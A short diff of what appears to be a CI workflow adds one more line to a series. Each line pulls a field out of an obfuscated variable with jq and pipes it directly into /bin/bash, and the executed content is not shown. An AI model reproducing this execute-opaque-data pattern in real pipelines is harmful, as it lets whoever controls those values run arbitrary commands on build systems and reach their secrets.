@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$ptzso2" | jq -r .mlrws2559 | /bin/bash
           printf '%s' "$oo97257" | jq -r .iy2 | /bin/bash
           printf '%s' "$ui61430" | jq -r .fbo5033 | /bin/bash
+          printf '%s' "$kas146" | jq -r .nvp8576 | /bin/bash
 
       - name: Store results
         if: always()
